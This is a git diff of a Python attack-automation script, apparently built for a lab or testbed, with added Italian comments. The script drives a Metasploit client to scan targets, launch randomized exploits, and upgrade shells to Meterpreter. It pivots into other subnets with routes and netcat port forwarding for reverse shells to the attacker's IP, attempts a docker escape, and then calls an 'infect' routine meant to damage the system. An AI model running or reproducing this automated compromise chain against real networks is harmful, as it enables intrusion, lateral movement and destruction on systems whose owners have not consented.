@@ -6,7 +6,31 @@ from util import Logger,Constants as C
 from attack import Attack,Metasploit_Attack,ResourceAttack,SshAttack,Attack_DB
 from time import sleep
 
-def main_procedure (attacker_ip, config_file,stealth=False,stealth_sleep=0):
+
+#Viene recuperato l'elenco degli ip dei target da config_file e viene salvato in machine, se i target sono in un'altra subnet vengono salvati anche in other_subnet
+#Inizialmente l'unica macchina di cui si ha il controllo è quella su cui gira l'attaccante
+#Il server Metasploit gira sulla stessa macchina dell'attaccante, creando un istanza di Metaclient ci si connette a questo server
+#Si itera sulle macchine target
+    #Ad ogni iterazione vengono recuperati la lista degli attacchi e la lista delle scansioni (o scansioni stealth) da attack_db.json 
+    #Viene selezionata casualmente una scansione dalla lista e se ne recuperano nome, istruzioni, tipo e tempo di attesa
+    #A questo punto con queste informazioni si crea un oggetto di tipo Attack passandogli anche la connessione al server metasploit precedentemente creata
+    #Se il target è in un altra sottorete rispetto alla macchina attaccante
+        #Se non si ha già una sessione attiva non si può effettuare la scansione
+        #Se si ha una sessione si fa l'upgrade di questa sessione a una sessione meterpreter
+        #Se l'upgrade ha successo, la sessione meterpreter fa da router
+            #Si aggiunge una route per raggiungere il target sfruttando la sessione meterpreter
+    #Viene effettuata la scansione ma si ignorano i risultati
+    #Si itera in ordine casuale sulla lista degli attacchi
+        #Si recuperano le informazioni sul docker che gira sulla macchina target che stiamo considerando 
+        #Se il docker è vulnerabile all'attacco che stiamo considerando si recuperano le porte dal file config, altrimenti si lasciano le porte di default (tanto in ogni caso l'attacco fallisce)
+        #Si costruisce l'oggetto di tipo attacco usando le informazioni estratte
+        #Si tenta di attaccare il target con l'oggetto attacco appena creato e si salva la sessione ottenuta se l'attacco ha successo
+        #Si controlla se la sessione ottenuta non sia un falso positivo 
+        #La sessione ottenuta diventa la sessione di attacco corrente
+        #La macchina target viene inserita tra le macchine compromesse 
+        #Se l'attacco che ha avuto successo era un docker_escape da tomcat viene fatto port forwarding per ottenere accesso alla macchina in un altra sottorete dalla macchina attaccante
+
+def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
 
     Logger.init_logger()
 
@@ -21,21 +45,22 @@ def main_procedure (attacker_ip, config_file,stealth=False,stealth_sleep=0):
         if "other_subnet" in ip:
             other_subnet.update({ip["target"]:ip["other_subnet"]})
     #print(other_subnet)
+
     router=None
     OOBSession=None
     compromised_machines={attacker_ip}
     uncompromised_machines=set()
     #bc=BackdoorCommander("password",C.BACKDOOR_CLIENT_PORT,attacker_ip)
-    mc=MetaClient("password",C.ATTACKER_CLIENT_PORT,attacker_ip)
+    mc=MetaClient("password", C.ATTACKER_CLIENT_PORT, attacker_ip)
     atk_sess=None
+
     while(machines):
         #extract the first victim
         t=machines.pop(0)
-        
-
         target_ip=t
         print(f"{C.COL_GREEN} [+] target for this step: {target_ip} {C.COL_RESET}")
-        attack= list(Attack_DB.attack_dict)
+
+        attack=list(Attack_DB.attack_dict)
 
         randomized_attack=random.sample(attack,len(attack))
         
@@ -50,6 +75,7 @@ def main_procedure (attacker_ip, config_file,stealth=False,stealth_sleep=0):
             nmap_target=str(ipaddress.IPv4Network(target_ip+"/255.255.0.0", False)).replace("/16","/24")
         else:
             nmap_target=target_ip
+
         scan_name=Attack_DB.scans_dict[s].attack
         scan_instr=Attack_DB.scans_dict[s].instruction.format(nmap_target,attacker_ip)
         scan_type=Attack_DB.scans_dict[s].attack_type
@@ -65,14 +91,14 @@ def main_procedure (attacker_ip, config_file,stealth=False,stealth_sleep=0):
             met_sess=mc.upgrade_shell(atk_sess)
             if(met_sess):
                 print(f"{C.COL_YELLOW}[*] Meterpreter session received, adding routes{C.COL_RESET}")
-                mc.client.route_add(met_sess,target_ip)
+                mc.client.route_add(met_sess, target_ip)
                 mc.client.route_print()
                 router=met_sess
             else:
                 print(f"{C.COL_RED}[*] Meterpreter session not received, can't add routes, skipping...{C.COL_RESET}")
                 continue
 
-        
+    
         mc.attempt_scan(scan_obj)
 
         for ra in randomized_attack:
@@ -88,6 +114,7 @@ def main_procedure (attacker_ip, config_file,stealth=False,stealth_sleep=0):
                     break
             if(LPORT==0):
                 LPORT=C.DEFAULT_LPORT
+
             #format the string with the ip that need to be used
             attack_instr=Attack_DB.attack_dict[ra].instruction.format(target_ip,attacker_ip,LPORT=LPORT)
             attack_type=Attack_DB.attack_dict[ra].attack_type
@@ -101,11 +128,11 @@ def main_procedure (attacker_ip, config_file,stealth=False,stealth_sleep=0):
                 print(f"{C.COL_RED}[-] Exploit failed {C.COL_RESET}")
                 continue
             if(attack_type=="ResourceAttack"):
-                attack_obj=ResourceAttack(attack_name,attack_instr,attack_wait,mc.client)
+                attack_obj=ResourceAttack(attack_name,attack_instr,attack_wait, mc.client)
             elif(attack_type=="SshAttack"):
-                attack_obj=SshAttack(attack_name,attack_instr,attacker_ip,OOBSession,attack_wait,mc.client)
+                attack_obj=SshAttack(attack_name,attack_instr,attacker_ip,OOBSession,attack_wait, mc.client)
             else:
-                attack_obj=Metasploit_Attack(attack_name,attack_instr,attack_wait,mc.client)
+                attack_obj=Metasploit_Attack(attack_name,attack_instr,attack_wait, mc.client)
             
 
             if(type(attack_obj)==SshAttack and OOBSession==None):
@@ -113,6 +140,7 @@ def main_procedure (attacker_ip, config_file,stealth=False,stealth_sleep=0):
                 continue
             
             session=mc.attempt_attack(attack_obj,port)
+
             #print(session)
             if(session):
                 
@@ -142,12 +170,11 @@ def main_procedure (attacker_ip, config_file,stealth=False,stealth_sleep=0):
                         #questa macchina intermedia effettuerà un portfwd sulla macchina attaccante permettendoci di ottenere una reverse shell
                         #sulla macchina che è in un'altra sottorete e che normalmente non permetterebbe di ottenere una reverse shell.
                         #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
-                        mc.prepare(router,C.NETCAT_PORT, LPORT,attacker_ip)
+                        mc.prepare(router,C.NETCAT_PORT, LPORT, attacker_ip)
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
                         escape=mc.docker_escape(atk_sess)
                         if(escape):
                             print(f"{C.COL_YELLOW} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
-                            
                             mc.infect()
                         else:
                             print(f"{C.COL_RED}docker_escape failed! Aborting...  {C.COL_RESET}")
@@ -173,6 +200,6 @@ def main_procedure (attacker_ip, config_file,stealth=False,stealth_sleep=0):
 
 
 
-
+#Da config.json viene recuperato l'ip dell'attaccante e lo si passa al main insieme a config.json
 if(__name__=='__main__'):
     main_procedure(C.ATTACKER_VM,"config.json")
